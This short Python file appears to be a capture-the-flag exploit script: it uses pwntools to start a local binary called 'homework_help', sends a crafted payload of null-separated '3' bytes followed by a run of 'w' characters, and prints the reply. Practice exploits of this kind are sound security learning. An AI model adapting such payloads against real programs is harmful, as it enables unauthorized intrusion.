from pwn import *

p=process('./homework_help')

payload =b'3\x00'*3 + b'wwwwwwwwwwwwwwwwwwwwwwwwwww'
print(payload)

p.sendline(payload)

resp = p.recv() 

print(resp)
